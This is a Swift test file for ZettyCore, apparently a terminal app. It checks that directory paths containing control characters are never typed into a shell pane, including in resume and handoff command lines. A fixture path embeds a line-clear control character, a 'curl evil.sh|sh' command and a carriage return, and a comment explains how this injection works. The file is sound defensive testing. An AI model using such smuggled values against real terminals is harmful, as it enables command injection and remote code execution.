import Testing
@testable import ZettyCore

// Text Zetty TYPES into a pane goes through the shell's line editor before
// any quoting applies, so a control character in it acts as a key: a folder
// named "x<^U>curl evil|sh<CR>" clears the line and runs the rest (bug hunt,
// 2026-11-13). Such text is never typed.

private let evil = "/tmp/x\u{15}curl evil.sh|sh\r"

@Test func controlCharactersAreNotTypeable() {
    #expect(ShellQuote.isTypeable("/Users/me/work/api"))
    #expect(ShellQuote.isTypeable("/Users/me/Ünïcödé dir"))
    #expect(!ShellQuote.isTypeable(evil))
    #expect(!ShellQuote.isTypeable("a\u{7F}b"))
    #expect(!ShellQuote.isTypeable("a\u{9B}b"))   // C1 CSI
    #expect(!ShellQuote.isTypeable("a\tb"))
}

@Test func aResumeLineDropsAnUntypeableDirectory() {
    let id = "0b9d2c1e-7f3a-4c2b-9d1e-5a6b7c8d9e0f"
    let line = RestartRecovery.resumeCommand(agent: .claude, sessionID: id, cwd: evil)
    #expect(line != nil)
    #expect(line.map(ShellQuote.isTypeable) == true)
    #expect(line?.contains("cd ") == false)
    // An ordinary directory still gets its cd.
    #expect(RestartRecovery.resumeCommand(agent: .claude, sessionID: id, cwd: "/tmp/ok")?
        .hasPrefix("cd '/tmp/ok' && ") == true)
}

@Test func handoffLinesAreNeverTypedWithControlCharacters() {
    let line = AgentHandoff.launchLine(agent: .claude, login: ResumeLogin(environment: [:], unsetting: []),
                                       cwd: evil, briefPath: "/Users/me/.zetty/handoff.md")
    #expect(line.map(ShellQuote.isTypeable) ?? true)
    #expect(AgentHandoff.launchLine(agent: .claude, login: ResumeLogin(environment: [:], unsetting: []),
                                    cwd: "/tmp/ok", briefPath: "/tmp/x\rbad") == nil)
}
